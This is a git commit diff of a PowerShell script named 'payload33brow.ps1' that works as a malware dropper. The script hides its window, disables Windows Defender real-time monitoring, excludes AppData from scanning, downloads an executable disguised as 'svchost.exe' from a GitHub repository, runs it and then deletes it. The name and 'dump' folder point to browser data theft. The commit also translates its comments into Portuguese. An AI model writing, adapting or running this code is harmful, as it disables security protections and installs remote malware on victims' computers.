28b5a7cdf526cbbcdfaf40289422a6d65edf4616
user337666 <129235545+user337666@users.noreply.github.com>
2025-06-07 01:14:44 -0300

    payload33brow.ps1

--- payload33brow.ps1
+++ payload33brow.ps1
@@ -1,13 +1,16 @@
 $t = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
 add-type -name win -member $t -namespace native
-[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) 
-#Adding windows defender exclusionpath
+[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0)
+Set-MpPreference -DisableRealtimeMonitoring $true
+# Adicionar uma exclusÃ£o de caminho no Windows Defender
 Add-MpPreference -ExclusionPath "$env:appdata"
-#Creating the directory we will work on
+# Criar o diretÃ³rio de trabalho
 mkdir "$env:appdata\dump"
 Set-Location "$env:appdata\dump"
-#Downloading and executing sv.exe
-Invoke-WebRequest -Uri "https://github.com/user337666/brow666/raw/main/svchost.exe" -OutFile "$env:appdata\dump\sv.exe"
+# Baixar e executar sv.exe
+Invoke-WebRequest -Uri "https://github.com/user337666/brow666/raw/refs/heads/main/svchost.exe" -OutFile "$env:appdata\dump\svchost.exe"
 ./sv.exe
+# Aguardar 6 segundos
 Start-Sleep -Seconds 6
-Remove-Item -Path "$env:appdata\dump\sv.exe" -Force
+# Remover o arquivo baixado
+Remove-Item -Path "$env:appdata\dump\svchost.exe" -Force
